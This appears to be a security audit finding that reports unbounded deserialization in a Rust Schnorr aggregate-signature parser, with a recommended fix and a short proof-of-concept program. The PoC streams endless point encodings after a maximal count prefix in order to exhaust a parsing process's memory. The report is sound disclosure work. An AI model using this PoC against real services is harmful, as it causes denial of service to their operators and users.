### Title
Unbounded SchnorrAggregate deserialization enables remote memory exhaustion - (File: `crypto/schnorr/src/aggregate.rs`)

### Summary
`SchnorrAggregate::read` trusts a 32-bit serialized nonce-count field and decodes up to 4,294,967,295 group elements into an unbounded `Vec`. [1](#0-0) 

### Finding Description
The parser reads four bytes, interprets them as `u32::from_le_bytes`, and pushes one `C::G` into `Rs` for every declared element without limiting the count against an expected aggregate size or available input. [2](#0-1)   
The declared count therefore controls both CPU work and heap growth before `s` is read or any signature verification occurs. [3](#0-2) 

### Impact Explanation
An unprivileged peer that can submit a serialized aggregate signature can provide a stream of valid point encodings until process memory is exhausted, causing denial of service before `SchnorrAggregate::verify` can reject the object. [3](#0-2)   
Verification allocates another vector proportional to the number of nonces, so successful parsing also causes additional memory pressure during verification. [4](#0-3) 

### Likelihood Explanation
The issue is reachable wherever untrusted bytes are passed to the public `SchnorrAggregate::read` API; exploitation does not require a valid signature, valid challenges, private keys, or malformed point encodings. [5](#0-4)   
A truncated input fails quickly, but a live peer can continue supplying canonical point encodings and trigger growth proportional to the attacker-declared count.

### Recommendation
Enforce a protocol-defined maximum aggregate size before entering the loop, preferably deriving the expected count from the verifier’s `keys_and_challenges` length rather than an attacker-supplied prefix. [1](#0-0)   
If the count must remain serialized, reject implausible values before allocation and bound the reader by the maximum serialized signature length.

### Proof of Concept
The following conceptual PoC uses an endless stream of canonical generator encodings; `u32::MAX` causes `SchnorrAggregate::read` to continue inserting decoded points until memory exhaustion:

```rust
use std::io::{self, Read};

use ciphersuite::{Ciphersuite, group::GroupEncoding};
use frost::curve::Secp256k1;
use schnorr::aggregate::SchnorrAggregate;

struct EndlessGenerators;

impl Read for EndlessGenerators {
  fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
    let generator = <Secp256k1 as Ciphersuite>::generator().to_bytes();
    for chunk in out.chunks_mut(generator.as_ref().len()) {
      chunk.copy_from_slice(&generator.as_ref()[.. chunk.len()]);
    }
    Ok(out.len())
  }
}

fn main() {
  let count = u32::MAX.to_le_bytes();
  let mut reader = count.as_slice().chain(EndlessGenerators);

  // Grows Rs until allocation fails; s is only read after all declared points.
  let _ = SchnorrAggregate::<Secp256k1>::read(&mut reader);
}
```

### Citations

**File:** crypto/schnorr/src/aggregate.rs (L75-88)
```rust
impl<C: Ciphersuite> SchnorrAggregate<C> {
  /// Read a SchnorrAggregate from something implementing Read.
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    let mut len = [0; 4];
    reader.read_exact(&mut len)?;

    #[allow(non_snake_case)]
    let mut Rs = vec![];
    for _ in 0 .. u32::from_le_bytes(len) {
      Rs.push(C::read_G(reader)?);
    }

    Ok(SchnorrAggregate { Rs, s: C::read_F(reader)? })
  }
```

**File:** crypto/schnorr/src/aggregate.rs (L138-145)
```rust
    let mut pairs = Vec::with_capacity((2 * keys_and_challenges.len()) + 1);
    for (i, (key, challenge)) in keys_and_challenges.iter().enumerate() {
      let z = weight(&mut digest);
      pairs.push((z, self.Rs[i]));
      pairs.push((z * challenge, *key));
    }
    pairs.push((-self.s, C::generator()));
    multiexp_vartime(&pairs).is_identity().into()
```
